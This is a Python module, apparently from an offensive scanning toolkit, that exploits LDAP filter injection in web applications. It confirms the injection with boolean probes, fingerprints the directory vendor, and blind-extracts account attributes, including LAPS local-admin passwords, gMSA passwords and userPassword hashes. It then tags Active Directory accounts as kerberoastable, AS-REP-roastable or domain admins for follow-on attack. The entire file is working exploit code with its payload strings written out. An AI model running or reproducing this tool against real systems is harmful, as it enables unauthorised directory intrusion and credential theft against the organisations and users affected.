"""
ldap_dump.py — When the web app appears to be backed by LDAP/AD, confirm
injection at the param level, fingerprint the directory vendor, then extract
high-value attributes via boolean-blind filter injection.

Pipeline position: after ActiveScanner runs, before report. Sibling of
[[sql_dump]] — same shape, different backend.

Candidate sourcing (we don't yet have a dedicated `ldapi_*` attack_type in
ActiveScanner, so we mine candidates the cheap way):
  - active_scan_result.findings whose response_snippet matches an LDAP error
    pattern (LDAPException, javax.naming.NamingException, AD HRESULTs, …)
  - classifier_findings whose URL/param names look LDAP-shaped (login, auth,
    user, query, search, filter, dn, base, account)

Confirmation: per candidate (endpoint, param) we run a 4-probe boolean test
(baseline / wildcard / always-true / always-false). A finding is "confirmed"
when the responses split into the expected two-class shape (true-class ≠
false-class, wildcard ≈ true-class).

Vendor fingerprint heuristics:
  - Active Directory      sAMAccountName / objectSid / memberOf=CN=…,DC=…,
                          0x8007203a / 0x80072020 / 0x80004005 errors
  - OpenLDAP              ldap_sasl_bind, "Invalid DN syntax", posixAccount
  - ApacheDS              "Apache Directory" in error body
  - OpenDJ                "OpenDJ" in error body or vendorName=

Extraction strategy (per attribute):
  1. Inline scrape  — inject `*)(<attr>=*)(&(1=1` and pull values that appear
                       verbatim in the response body (cheap, common when
                       the app templates LDAP results into HTML/JSON).
  2. Char-walk      — fall back to boolean-blind prefix walking when the
                       value isn't templated. `*)(<attr>=<prefix><c>*)(&(1=1`
                       — extend the prefix on each successful probe, cap at
                       _MAX_ATTR_LEN.

AD-specific post-processing:
  - parse userAccountControl integer into named flags
  - tag KERBEROASTABLE      (servicePrincipalName set + not a computer)
  - tag ASREPROASTABLE      (UAC has DONT_REQ_PREAUTH = 0x400000)
  - tag DISABLED            (UAC has ACCOUNTDISABLE = 0x2)
  - tag NO_EXPIRE           (UAC has DONT_EXPIRE_PASSWORD = 0x10000)
  - tag DOMAIN_ADMIN        (memberOf includes "Domain Admins" or adminCount=1)
  - tag LAPS_READABLE       (ms-Mcs-AdmPwd extracted = local-admin password)
  - tag GMSA_READABLE       (msDS-ManagedPassword extracted)

Output layout (under <out>/ldap_dump/):
  fingerprint.json          — vendor(s) + confidence + evidence
  accounts/<id>.json        — extracted account attributes + tags
  groups/<cn>.json          — extracted group + members
  high_value.json           — kerberoastable / asreproastable / DA / LAPS list
  notes.json                — diagnostic notes when extraction stalls

Cross-link: any extracted account whose mail/uid/sAMAccountName matches an
existing enrichment UserRecord is appended into users/<id>/ldap/<dn>.json.

Direct LDAP bind (anonymous / rebind with discovered creds) lives in a
separate ad_recon.py (deferred — would add `ldap3` dependency).
"""

from __future__ import annotations

import asyncio
import json
import re
import string
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx


# ---------------------------------------------------------------------------
# Vendor catalog
# ---------------------------------------------------------------------------

@dataclass
class VendorInfo:
    name: str
    error_signatures: list[str]   # case-insensitive substrings
    shape_signatures: list[str]   # response-body markers for happy responses
    high_value_attrs: list[str]
    standard_attrs: list[str]


_AD_HIGH_VALUE = [
    "sAMAccountName", "userPrincipalName", "memberOf",
    "userAccountControl", "servicePrincipalName", "adminCount",
    "lastLogon", "pwdLastSet", "objectSid", "objectGUID",
    "ms-Mcs-AdmPwd", "msDS-ManagedPassword",
    "description", "displayName", "mail",
]

_AD_STANDARD = [
    "cn", "name", "givenName", "sn", "title", "department",
    "company", "manager", "telephoneNumber", "mobile",
    "physicalDeliveryOfficeName", "whenCreated", "whenChanged",
]

_GENERIC_HIGH_VALUE = [
    "userPassword", "mail", "uid", "memberOf", "homeDirectory",
    "loginShell", "krbPrincipalName", "krbLastPwdChange",
    "shadowLastChange", "telephoneNumber",
]

_GENERIC_STANDARD = [
    "cn", "sn", "givenName", "displayName", "ou", "dc",
    "objectClass", "description", "title",
]


_VENDORS = [
    VendorInfo(
        name="active_directory",
        error_signatures=[
            "0x8007203a", "0x80072020", "0x80004005",
            "DirectoryServicesCOMException",
            "the server is not operational",
            "name reference is invalid",
            "ldap_search_s",
        ],
        shape_signatures=[
            "samaccountname", "objectsid", "objectguid",
            "memberof=cn=", "userprincipalname",
            "userAccountControl",
        ],
        high_value_attrs=_AD_HIGH_VALUE,
        standard_attrs=_AD_STANDARD,
    ),
    VendorInfo(
        name="openldap",
        error_signatures=[
            "ldap_sasl_bind", "ldap_simple_bind",
            "invalid dn syntax", "no such object",
            "LDAP_INVALID_CREDENTIALS",
            "OpenLDAP",
        ],
        shape_signatures=[
            "objectclass: posixaccount",
            "objectclass: inetorgperson",
            "dn: uid=", "dn: cn=",
        ],
        high_value_attrs=_GENERIC_HIGH_VALUE,
        standard_attrs=_GENERIC_STANDARD,
    ),
    VendorInfo(
        name="apacheds",
        error_signatures=["apache directory", "apacheds"],
        shape_signatures=["dn: uid=", "dn: cn="],
        high_value_attrs=_GENERIC_HIGH_VALUE,
        standard_attrs=_GENERIC_STANDARD,
    ),
    VendorInfo(
        name="opendj",
        error_signatures=["opendj", "forgerock"],
        shape_signatures=["dn: uid=", "dn: cn="],
        high_value_attrs=_GENERIC_HIGH_VALUE,
        standard_attrs=_GENERIC_STANDARD,
    ),
    VendorInfo(
        name="generic_ldap",
        error_signatures=[
            "javax.naming.namingexception",
            "javax.naming.directory",
            "ldapexception",
            "bad search filter",
            "invalid filter",
            "ldap_search",
            "com.sun.jndi.ldap",
        ],
        shape_signatures=["dn:", "objectclass"],
        high_value_attrs=_GENERIC_HIGH_VALUE,
        standard_attrs=_GENERIC_STANDARD,
    ),
]


# Active Directory userAccountControl flag map (subset that matters for triage).
_UAC_FLAGS: list[tuple[int, str]] = [
    (0x00000002, "ACCOUNTDISABLE"),
    (0x00000010, "LOCKOUT"),
    (0x00000020, "PASSWD_NOTREQD"),
    (0x00000040, "PASSWD_CANT_CHANGE"),
    (0x00000080, "ENCRYPTED_TEXT_PWD_ALLOWED"),
    (0x00000200, "NORMAL_ACCOUNT"),
    (0x00000800, "INTERDOMAIN_TRUST_ACCOUNT"),
    (0x00001000, "WORKSTATION_TRUST_ACCOUNT"),
    (0x00002000, "SERVER_TRUST_ACCOUNT"),
    (0x00010000, "DONT_EXPIRE_PASSWORD"),
    (0x00040000, "SMARTCARD_REQUIRED"),
    (0x00080000, "TRUSTED_FOR_DELEGATION"),
    (0x00100000, "NOT_DELEGATED"),
    (0x00200000, "USE_DES_KEY_ONLY"),
    (0x00400000, "DONT_REQ_PREAUTH"),
    (0x00800000, "PASSWORD_EXPIRED"),
    (0x01000000, "TRUSTED_TO_AUTH_FOR_DELEGATION"),
]


def parse_uac(value) -> list[str]:
    """Return human-readable flag names set in a userAccountControl int."""
    try:
        n = int(value)
    except (TypeError, ValueError):
        return []
    return [name for bit, name in _UAC_FLAGS if n & bit]


# ---------------------------------------------------------------------------
# Heuristics — which params/endpoints look LDAP-shaped
# ---------------------------------------------------------------------------

_LDAP_PARAM_HINTS = re.compile(
    r"(user|usr|uid|login|cn|dn|base|filter|account|sam|"
    r"member|group|search|query|q|email|mail|principal)",
    re.IGNORECASE,
)

_ALL_ERROR_SIGNATURES = [s for v in _VENDORS for s in v.error_signatures]


def _looks_ldap(text: str) -> bool:
    if not text:
        return False
    low = text.lower()
    return any(sig in low for sig in _ALL_ERROR_SIGNATURES)


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------

@dataclass
class VendorFingerprint:
    vendor: str
    confidence: float
    evidence: str
    source_finding: str = ""

    def to_dict(self) -> dict:
        return {
            "vendor": self.vendor, "confidence": self.confidence,
            "evidence": self.evidence, "source_finding": self.source_finding,
        }


@dataclass
class LDAPAccount:
    identifier: str                 # sam / uid / cn — first non-empty
    dn: str = ""
    attributes: dict = field(default_factory=dict)
    tags: list[str] = field(default_factory=list)
    source_endpoint: str = ""
    source_param: str = ""

    def to_dict(self) -> dict:
        return {
            "identifier": self.identifier,
            "dn": self.dn,
            "attributes": self.attributes,
            "tags": self.tags,
            "source_endpoint": self.source_endpoint,
            "source_param": self.source_param,
        }


@dataclass
class InjectionConfirmed:
    endpoint: str
    param: str
    baseline_len: int
    true_len: int
    false_len: int
    wildcard_len: int

    def to_dict(self) -> dict:
        return {
            "endpoint": self.endpoint, "param": self.param,
            "baseline_len": self.baseline_len,
            "true_len": self.true_len,
            "false_len": self.false_len,
            "wildcard_len": self.wildcard_len,
        }


@dataclass
class LDAPDumpResult:
    fingerprints: list[VendorFingerprint] = field(default_factory=list)
    confirmed_injections: list[InjectionConfirmed] = field(default_factory=list)
    accounts: list[LDAPAccount] = field(default_factory=list)
    groups: list[LDAPAccount] = field(default_factory=list)
    high_value: list[dict] = field(default_factory=list)
    extraction_attempts: int = 0
    successful_extractions: int = 0
    out_dir: str = ""
    notes: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "out_dir": self.out_dir,
            "fingerprints": [f.to_dict() for f in self.fingerprints],
            "confirmed_injections": [c.to_dict() for c in self.confirmed_injections],
            "accounts": [a.to_dict() for a in self.accounts],
            "groups": [g.to_dict() for g in self.groups],
            "high_value": self.high_value,
            "extraction_attempts": self.extraction_attempts,
            "successful_extractions": self.successful_extractions,
            "notes": self.notes,
        }


# ---------------------------------------------------------------------------
# Dumper
# ---------------------------------------------------------------------------

class LDAPDumper:
    _MAX_CANDIDATES = 8                 # per scan — keeps noise bounded
    _MAX_ATTR_LEN = 40                  # char-walk depth cap
    _MAX_ACCOUNTS = 30
    _CHAR_ALPHABET = (
        string.ascii_lowercase + string.digits + "._-@"
    )
    _LEN_DELTA_RATIO = 0.04             # min |Δlen|/baseline to call it a split
    _LEN_DELTA_ABS = 64                 # … or this many bytes, whichever bigger

    def __init__(self, out_dir: str, timeout: float = 12.0,
                 auth_headers: Optional[dict] = None):
        self.out_root = Path(out_dir) / "ldap_dump"
        self.timeout = timeout
        self.auth_headers = auth_headers or {}

    # ------------------------------------------------------------------
    # Entry point
    # ------------------------------------------------------------------

    async def run(self, active_scan_result, classifier_findings=None,
                  enrichment_result=None) -> LDAPDumpResult:
        result = LDAPDumpResult(out_dir=str(self.out_root))

        candidates = self._gather_candidates(active_scan_result, classifier_findings)
        if not candidates:
            result.notes.append("no LDAP-shaped candidates from scan/classifier")
            return result
        result.notes.append(f"{len(candidates)} candidate (endpoint, param) pairs")

        # Vendor fingerprint from whatever error snippets we collected upstream
        result.fingerprints = self._fingerprint_from_findings(
            active_scan_result, classifier_findings
        )

        self.out_root.mkdir(parents=True, exist_ok=True)
        (self.out_root / "fingerprint.json").write_text(json.dumps(
            [f.to_dict() for f in result.fingerprints], indent=2,
        ))

        async with httpx.AsyncClient(
            verify=False, timeout=self.timeout, follow_redirects=True,
            headers=self.auth_headers,
        ) as client:
            # Confirm injection on each candidate, take the first that proves
            # boolean-distinguishable. (We could test all; for scope we stop
            # at the first confirmed and dump from there — bounded loudness.)
            confirmed = await self._confirm_candidates(client, candidates)
            if not confirmed:
                result.notes.append(
                    "no candidate produced a boolean-blind split — "
                    "injection not exploitable in this form"
                )
                return result
            result.confirmed_injections = confirmed

            # Pick vendor: use highest-confidence fingerprint or fall back to
            # generic_ldap (its attribute lists are a superset of the others
            # for our purposes).
            vendor = next(
                (v for v in _VENDORS
                 if result.fingerprints
                 and v.name == result.fingerprints[0].vendor),
                next(v for v in _VENDORS if v.name == "generic_ldap"),
            )
            result.notes.append(f"vendor={vendor.name}")

            # Dump from the strongest split
            best = max(confirmed, key=self._split_strength)
            attrs_to_try = vendor.high_value_attrs + vendor.standard_attrs
            await self._dump_endpoint(client, best, vendor, attrs_to_try, result)

        # AD-aware post-processing on whatever we got
        self._tag_high_value(result, vendor)

        # Write outputs
        self._persist(result)

        # Cross-link any account into enrichment user folders
        if enrichment_result and result.accounts:
            self._cross_link_to_users(enrichment_result, result.accounts)

        return result

    # ------------------------------------------------------------------
    # Candidate sourcing
    # ------------------------------------------------------------------

    def _gather_candidates(self, active_scan_result, classifier_findings
                            ) -> list[tuple[str, str]]:
        """Return [(url, param_name), …] ranked roughly by likelihood."""
        seen: set[tuple[str, str]] = set()
        ranked: list[tuple[int, str, str]] = []

        def add(url: str, param: str, score: int) -> None:
            if not param:
                return
            key = (url, param)
            if key in seen:
                return
            seen.add(key)
            ranked.append((score, url, param))

        if active_scan_result:
            for f in getattr(active_scan_result, "findings", []) or []:
                snippet = getattr(f, "response_snippet", "") or ""
                evidence = getattr(f, "evidence", "") or ""
                score = 0
                if _looks_ldap(snippet) or _looks_ldap(evidence):
                    score += 10
                if _LDAP_PARAM_HINTS.search(getattr(f, "param", "") or ""):
                    score += 3
                if score:
                    add(f.endpoint, f.param, score)

        if classifier_findings:
            for f in classifier_findings:
                url = getattr(f, "url", "") or ""
                if not url:
                    continue
                parsed = urlparse(url)
                for p in parse_qs(parsed.query).keys():
                    if _LDAP_PARAM_HINTS.search(p):
                        add(url, p, 1)

        ranked.sort(key=lambda t: -t[0])
        return [(u, p) for _s, u, p in ranked[:self._MAX_CANDIDATES]]

    def _fingerprint_from_findings(self, active_scan_result,
                                    classifier_findings
                                    ) -> list[VendorFingerprint]:
        """Scan response snippets for vendor error signatures. Highest-
        confidence vendor wins; ties broken by AD > openldap > others."""
        snippets: list[tuple[str, str]] = []
        if active_scan_result:
            for f in getattr(active_scan_result, "findings", []) or []:
                snip = getattr(f, "response_snippet", "") or ""
                if snip:
                    snippets.append((snip, getattr(f, "endpoint", "")))
        if classifier_findings:
            for f in classifier_findings:
                for attr in ("body", "evidence", "snippet"):
                    s = getattr(f, attr, "") or ""
                    if s:
                        snippets.append((s, getattr(f, "url", "")))

        scored: dict[str, VendorFingerprint] = {}
        for text, source in snippets:
            low = text.lower()
            for v in _VENDORS:
                for sig in v.error_signatures:
                    if sig.lower() in low:
                        cur = scored.get(v.name)
                        if cur is None or cur.confidence < 0.85:
                            scored[v.name] = VendorFingerprint(
                                vendor=v.name, confidence=0.85,
                                evidence=f"matched signature: {sig!r}",
                                source_finding=source,
                            )
                for sig in v.shape_signatures:
                    if sig.lower() in low:
                        cur = scored.get(v.name)
                        score = 0.6
                        if cur is None or cur.confidence < score:
                            scored[v.name] = VendorFingerprint(
                                vendor=v.name, confidence=score,
                                evidence=f"matched shape: {sig!r}",
                                source_finding=source,
                            )
        # Order: AD > openldap > apacheds > opendj > generic_ldap, then by conf
        order = {v.name: i for i, v in enumerate(_VENDORS)}
        return sorted(
            scored.values(),
            key=lambda f: (-f.confidence, order.get(f.vendor, 99)),
        )

    # ------------------------------------------------------------------
    # Boolean-blind confirmation
    # ------------------------------------------------------------------

    async def _confirm_candidates(self, client,
                                   candidates: list[tuple[str, str]]
                                   ) -> list[InjectionConfirmed]:
        tasks = [self._probe_boolean(client, u, p) for u, p in candidates]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if isinstance(r, InjectionConfirmed)]

    async def _probe_boolean(self, client, url: str, param: str
                             ) -> Optional[InjectionConfirmed]:
        """Four GETs: baseline / wildcard / always-true / always-false.
        Confirmed when true vs false split by >= _LEN_DELTA_RATIO and
        wildcard tracks the true class."""
        baseline = await self._request(client, url, param, "x")
        wildcard = await self._request(client, url, param, "*")
        # Always-true: "*)(<param>=*)(&(1=1" — close the filter and add a tautology
        always_true = await self._request(
            client, url, param, f"*)({param}=*)(&(1=1"
        )
        # Always-false: "*)(<param>=zzznoSuchThing)(&(1=1"
        always_false = await self._request(
            client, url, param, f"*)({param}=zzzNoSuchThing__)(&(1=1"
        )

        if None in (baseline, wildcard, always_true, always_false):
            return None

        bl_len, wc_len, t_len, f_len = (
            len(baseline), len(wildcard), len(always_true), len(always_false)
        )

        delta = abs(t_len - f_len)
        threshold = max(self._LEN_DELTA_ABS, bl_len * self._LEN_DELTA_RATIO)
        if delta < threshold:
            return None
        # Wildcard should resemble the true class (within half the split delta).
        if abs(wc_len - t_len) > delta:
            # The split could still be real but inverted (some apps return
            # MORE when filter is malformed). Accept it; downstream walker
            # will compare against the established true-class length.
            pass

        return InjectionConfirmed(
            endpoint=url, param=param,
            baseline_len=bl_len, true_len=t_len,
            false_len=f_len, wildcard_len=wc_len,
        )

    @staticmethod
    def _split_strength(c: InjectionConfirmed) -> int:
        return abs(c.true_len - c.false_len)

    async def _request(self, client, url: str, param: str, value: str
                       ) -> Optional[str]:
        """GET url with `param=value` (inject into existing query). Returns
        body text or None on error/non-2xx."""
        try:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [value]
            new_url = urlunparse(parsed._replace(
                query=urlencode(qs, doseq=True),
            ))
            r = await client.get(new_url)
        except Exception:
            return None
        if r.status_code >= 500:
            return None
        return r.text[:200000]

    # ------------------------------------------------------------------
    # Extraction
    # ------------------------------------------------------------------

    async def _dump_endpoint(self, client, conf: InjectionConfirmed,
                              vendor: VendorInfo,
                              attrs: list[str],
                              result: LDAPDumpResult) -> None:
        """For each attribute, try inline-scrape first; if no values surface,
        fall back to char-walking the first value (one row only — char-
        walking many rows is too slow to be useful here)."""
        # Inline scrape: wildcard everything and grep
        wide = await self._request(
            client, conf.endpoint, conf.param,
            f"*)({attrs[0]}=*)(&(1=1",
        )
        # The wide probe also leaks attributes if the response templates them
        inline_accounts = self._scrape_accounts(wide or "", attrs)
        for a in inline_accounts[:self._MAX_ACCOUNTS]:
            a.source_endpoint = conf.endpoint
            a.source_param = conf.param
            result.accounts.append(a)
            result.successful_extractions += 1

        # Char-walk anything we still don't have a value for
        for attr in attrs:
            result.extraction_attempts += 1
            if any(attr in acc.attributes for acc in result.accounts):
                continue
            value = await self._char_walk(client, conf, attr)
            if not value:
                continue
            # Attach to a synthesized "blind_account" record so the operator
            # at least sees what one match looks like.
            placeholder = next(
                (a for a in result.accounts if a.identifier == "<blind>"),
                None,
            )
            if placeholder is None:
                placeholder = LDAPAccount(
                    identifier="<blind>",
                    source_endpoint=conf.endpoint,
                    source_param=conf.param,
                )
                result.accounts.append(placeholder)
            placeholder.attributes[attr] = value
            result.successful_extractions += 1

    def _scrape_accounts(self, body: str, attrs: list[str]) -> list[LDAPAccount]:
        """Pull `attr: value` or `"attr": "value"` pairs out of the response
        body. Groups them into accounts by adjacency — a DN marker (or a new
        sAMAccountName/uid) starts a new account."""
        if not body:
            return []
        accounts: list[LDAPAccount] = []
        current = LDAPAccount(identifier="")

        # LDIF-style:  attr: value  (one per line)
        ldif_re = re.compile(
            r"^([A-Za-z][A-Za-z0-9-]{1,40}):\s*(.+?)\s*$",
            re.MULTILINE,
        )
        # JSON-ish:    "attr": "value"
        json_re = re.compile(
            r'"([A-Za-z][A-Za-z0-9-]{1,40})"\s*:\s*"([^"\n]{0,512})"',
        )

        def maybe_flush() -> None:
            nonlocal current
            if current.attributes:
                # Choose identifier: sam / uid / cn / mail, first non-empty
                for k in ("sAMAccountName", "uid", "cn", "mail", "userPrincipalName"):
                    v = current.attributes.get(k) or current.attributes.get(k.lower())
                    if v:
                        current.identifier = str(v)
                        break
                if not current.identifier:
                    current.identifier = f"row_{len(accounts) + 1}"
                accounts.append(current)
            current = LDAPAccount(identifier="")

        # Build attr lookup case-insensitive
        attr_set = {a.lower() for a in attrs} | {"dn", "samaccountname",
                                                  "userprincipalname"}

        for m in ldif_re.finditer(body):
            name, value = m.group(1), m.group(2)
            if name.lower() not in attr_set:
                continue
            if name.lower() == "dn":
                maybe_flush()
                current.dn = value
                continue
            current.attributes[name] = value

        # If we found nothing LDIF-shaped, try JSON-shape
        if not accounts and not current.attributes:
            for m in json_re.finditer(body):
                name, value = m.group(1), m.group(2)
                if name.lower() not in attr_set:
                    continue
                current.attributes[name] = value
                # Heuristic: a new sam / uid starts a new account
                if name.lower() in ("samaccountname", "uid"):
                    if len(current.attributes) > 1:
                        maybe_flush()
                        current.attributes[name] = value

        maybe_flush()
        return [a for a in accounts if a.attributes]

    async def _char_walk(self, client, conf: InjectionConfirmed,
                         attr: str) -> str:
        """Boolean-blind prefix walker for a single value.

        Strategy: assume the true-class length is `conf.true_len`. Probe
        `*)(<attr>=<prefix><c>*)(&(1=1` — if it matches the true class,
        extend the prefix by c. Stop when no candidate extends.
        """
        true_len = conf.true_len
        false_len = conf.false_len
        # Class-membership predicate: closer to true_len than false_len
        def is_true(body: str) -> bool:
            if body is None:
                return False
            d_t = abs(len(body) - true_len)
            d_f = abs(len(body) - false_len)
            return d_t < d_f

        prefix = ""
        for _ in range(self._MAX_ATTR_LEN):
            extended = False
            for c in self._CHAR_ALPHABET:
                body = await self._request(
                    client, conf.endpoint, conf.param,
                    f"*)({attr}={prefix}{c}*)(&(1=1",
                )
                if is_true(body):
                    prefix += c
                    extended = True
                    break
            if not extended:
                break
        if not prefix:
            return ""
        # Confirm with exact-match (no trailing wildcard)
        body = await self._request(
            client, conf.endpoint, conf.param,
            f"*)({attr}={prefix})(&(1=1",
        )
        if is_true(body):
            return prefix
        # Still a partial — return what we have; operator can refine
        return prefix

    # ------------------------------------------------------------------
    # AD-aware tagging
    # ------------------------------------------------------------------

    @staticmethod
    def _tag_high_value(result: LDAPDumpResult, vendor: VendorInfo) -> None:
        is_ad = vendor.name == "active_directory"
        for a in result.accounts:
            attrs_lc = {k.lower(): v for k, v in a.attributes.items()}
            tags: list[str] = []

            if is_ad:
                uac_flags = parse_uac(attrs_lc.get("useraccountcontrol"))
                if "ACCOUNTDISABLE" in uac_flags:
                    tags.append("DISABLED")
                if "DONT_EXPIRE_PASSWORD" in uac_flags:
                    tags.append("NO_EXPIRE")
                if "DONT_REQ_PREAUTH" in uac_flags:
                    tags.append("ASREPROASTABLE")
                if "TRUSTED_FOR_DELEGATION" in uac_flags:
                    tags.append("UNCONSTRAINED_DELEGATION")
                if "TRUSTED_TO_AUTH_FOR_DELEGATION" in uac_flags:
                    tags.append("CONSTRAINED_DELEGATION_PROTOCOL_TRANSITION")
                spn = attrs_lc.get("serviceprincipalname")
                is_computer_account = (
                    "WORKSTATION_TRUST_ACCOUNT" in uac_flags
                    or "SERVER_TRUST_ACCOUNT" in uac_flags
                )
                if spn and not is_computer_account:
                    tags.append("KERBEROASTABLE")
                if attrs_lc.get("admincount") == "1":
                    tags.append("DOMAIN_ADMIN_CANDIDATE")
                member_of = (attrs_lc.get("memberof") or "").lower()
                if "domain admins" in member_of or "enterprise admins" in member_of:
                    tags.append("DOMAIN_ADMIN")
                if attrs_lc.get("ms-mcs-admpwd"):
                    tags.append("LAPS_READABLE")
                if attrs_lc.get("msds-managedpassword"):
                    tags.append("GMSA_READABLE")
            else:
                if attrs_lc.get("userpassword"):
                    tags.append("PASSWORD_HASH_EXPOSED")

            a.tags = sorted(set(tags))
            if a.tags:
                result.high_value.append({
                    "identifier": a.identifier, "dn": a.dn,
                    "tags": a.tags,
                })

    # ------------------------------------------------------------------
    # Persistence
    # ------------------------------------------------------------------

    def _persist(self, result: LDAPDumpResult) -> None:
        accounts_dir = self.out_root / "accounts"
        accounts_dir.mkdir(exist_ok=True)
        for a in result.accounts:
            (accounts_dir / f"{self._safe_name(a.identifier)}.json").write_text(
                json.dumps(a.to_dict(), indent=2)
            )
        if result.high_value:
            (self.out_root / "high_value.json").write_text(
                json.dumps(result.high_value, indent=2)
            )
        (self.out_root / "notes.json").write_text(
            json.dumps(result.notes, indent=2)
        )
        (self.out_root / "confirmed_injections.json").write_text(
            json.dumps([c.to_dict() for c in result.confirmed_injections],
                       indent=2)
        )

    # ------------------------------------------------------------------
    # Cross-link to enrichment user folders
    # ------------------------------------------------------------------

    @staticmethod
    def _cross_link_to_users(enrichment_result,
                              accounts: list[LDAPAccount]) -> None:
        users = getattr(enrichment_result, "users", None) or {}
        if not users:
            return
        by_email = {e.lower(): u for u in users.values() for e in u.emails}
        by_username = {n.lower(): u for u in users.values() for n in u.usernames}

        for a in accounts:
            ident_keys = []
            for k in ("mail", "userPrincipalName", "uid",
                      "sAMAccountName", "cn"):
                v = a.attributes.get(k) or a.attributes.get(k.lower())
                if v:
                    ident_keys.append(str(v).lower())
            if a.identifier:
                ident_keys.append(a.identifier.lower())

            user = None
            for k in ident_keys:
                if k in by_email:
                    user = by_email[k]
                    break
                if k in by_username:
                    user = by_username[k]
                    break
            if not user:
                continue
            user_dir = Path(enrichment_result.out_dir) / "users" / user.canonical_id
            if not user_dir.exists():
                continue
            ldap_dir = user_dir / "ldap"
            ldap_dir.mkdir(exist_ok=True)
            (ldap_dir / f"{LDAPDumper._safe_name(a.identifier or 'account')}.json"
             ).write_text(json.dumps(a.to_dict(), indent=2))

    @staticmethod
    def _safe_name(s: str, max_len: int = 60) -> str:
        clean = re.sub(r"[^A-Za-z0-9._@-]+", "_", s).strip("_") or "x"
        return clean[:max_len]
